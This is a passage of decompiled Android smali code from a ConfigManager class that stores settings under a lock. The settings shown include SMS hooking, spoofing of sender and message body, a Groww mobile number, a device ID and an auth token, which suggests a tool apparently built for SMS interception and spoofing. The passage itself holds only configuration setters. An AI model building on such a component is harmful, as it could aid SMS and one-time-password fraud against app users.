    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->gms_sender:Z

    .line 794
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 796
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 797
    nop

    .line 798
    return-void

    .line 796
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 797
    throw v0
.end method

.method public setGrowwMobileNo(Ljava/lang/String;)V
    .locals 2
    .param p1, "str"    # Ljava/lang/String;

    .line 457
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 459
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 460
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    move-object v1, p1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->groww_mobile_no:Ljava/lang/String;

    .line 461
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 463
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 464
    nop

    .line 465
    return-void

    .line 463
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 464
    throw v0
.end method

.method public setHookSmsEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 801
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 803
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 804
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->hook_sms:Z

    .line 805
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 807
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 808
    nop

    .line 809
    return-void

    .line 807
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 808
    throw v0
.end method

.method public setIsLoggedIn(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 821
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 823
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 824
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    invoke-static {}, Lcom/rebel/module/ConfigManager;->encodeAuthToken()Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->isRoot:Ljava/lang/String;

    .line 825
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 827
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 828
    nop

    .line 829
    return-void

    .line 827
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 828
    throw v0
.end method

.method public setMobileNo(Ljava/lang/String;)V
    .locals 2
    .param p1, "str"    # Ljava/lang/String;

    .line 832
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 834
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 835
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    move-object v1, p1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->mobile_no:Ljava/lang/String;

    .line 836
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 838
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 839
    nop

    .line 840
    return-void

    .line 838
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 839
    throw v0
.end method

.method public setRegistredDeviceId(Ljava/lang/String;)V
    .locals 2
    .param p1, "str"    # Ljava/lang/String;

    .line 843
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 845
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 846
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    move-object v1, p1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->registred_id:Ljava/lang/String;

    .line 847
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 849
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 850
    nop

    .line 851
    return-void

    .line 849
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 850
    throw v0
.end method

.method public setSenderId(Ljava/lang/String;)V
    .locals 2
    .param p1, "str"    # Ljava/lang/String;

    .line 854
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 856
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 857
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    move-object v1, p1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->sender_id:Ljava/lang/String;

    .line 858
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 860
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 861
    nop

    .line 862
    return-void

    .line 860
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 861
    throw v0
.end method

.method public setSmsHooking2Enabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 483
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 485
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 486
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->sms_hooking_2:Z

    .line 487
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 489
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 490
    nop

    .line 491
    return-void

    .line 489
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 490
    throw v0
.end method

.method public setSmsSenderEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 865
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 867
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 868
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->sms_sender:Z

    .line 869
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 871
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 872
    nop

    .line 873
    return-void

    .line 871
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 872
    throw v0
.end method

.method public setSpoofBody(Ljava/lang/String;)V
    .locals 2
    .param p1, "str"    # Ljava/lang/String;

    .line 920
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 922
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 923
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    move-object v1, p1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_body:Ljava/lang/String;

    .line 924
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 926
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 927
    nop

    .line 928
    return-void

    .line 926
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 927
    throw v0
.end method

.method public setSpoofDirectionEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 876
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 878
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 879
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_direction:Z

    .line 880
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 882
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 883
    nop

    .line 884
    return-void

    .line 882
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 883
    throw v0
.end method

.method public setSpoofMobileEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 887
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 889
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 890
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_mobile:Z

    .line 891
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 893
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 894
    nop

    .line 895
    return-void

    .line 893
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 894
    throw v0
.end method

.method public setSpoofPreset(Ljava/lang/String;)V
    .locals 2
    .param p1, "preset"    # Ljava/lang/String;

    .line 898
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 900
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 901
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    move-object v1, p1

    goto :goto_0

    :cond_0
    const-string v1, "custom"

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_preset:Ljava/lang/String;

    .line 902
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 904
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 905
    nop

    .line 906
    return-void

    .line 904
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 905
    throw v0
.end method

.method public setSpoofSenderEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 909
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 911
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 912
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_sender:Z

    .line 913
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 915
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 916
    nop

    .line 917
    return-void

    .line 915
    :catchall_0
    move-exception v0

